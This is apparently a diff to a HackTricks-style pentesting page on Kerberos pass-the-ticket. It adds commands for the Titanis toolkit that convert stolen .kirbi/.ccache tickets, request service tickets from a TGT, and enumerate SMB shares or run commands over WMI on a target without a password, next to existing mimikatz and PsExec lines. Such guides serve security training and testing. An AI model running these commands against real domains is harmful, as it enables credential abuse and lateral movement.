@@ -40,11 +40,34 @@ klist #List tickets in cache to cehck that mimikatz has loaded the ticket
 .\PsExec.exe -accepteula \\lab-wdc01.jurassic.park cmd
 ```
 
+### Titanis Kerberos (PTT/PTK workflows)
+
+Titanis can operate directly with .kirbi or MIT ccache files and request tickets from TGTs, enabling PTT-style access without plaintext passwords.
+
+```bash
+# Inspect or convert tickets
+Kerb select -From user.kirbi                     # list tickets in a .kirbi
+Kerb select -From user.ccache -Into user.kirbi   # convert ccache => kirbi
+
+# Use a TGT to request service tickets
+Kerb tgsreq -Kdc dc.domain.local -Tgt user.tgt.kirbi cifs/TARGET, HOST/TARGET -OutputFile user-TARGET.kirbi
+
+# Access SMB and WMI using tickets (no password)
+Smb2Client enumshares TARGET -Tgt user.tgt.kirbi -Kdc dc.domain.local
+Wmi exec TARGET -Tgt user.tgt.kirbi -Kdc dc.domain.local "whoami /all"
+
+# Or pass specific service tickets
+Smb2Client enumshares TARGET -Tickets user-TARGET.kirbi
+```
+
+Notes
+- For Kerberos across platforms, Titanis accepts both .kirbi and .ccache and can append to output files when requesting multiple TGS.
+- When supplying a TGT, specify -Kdc so the client can obtain required service tickets automatically.
+
 ## References
 
 - [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
+- [Titanis repository](https://github.com/trustedsec/Titanis)
+- [Titanis Kerb tool docs](https://github.com/trustedsec/Titanis/blob/public/doc/UserGuide/tools/Kerb.md)
 
 {{#include ../../banners/hacktricks-training.md}}
-
-
-
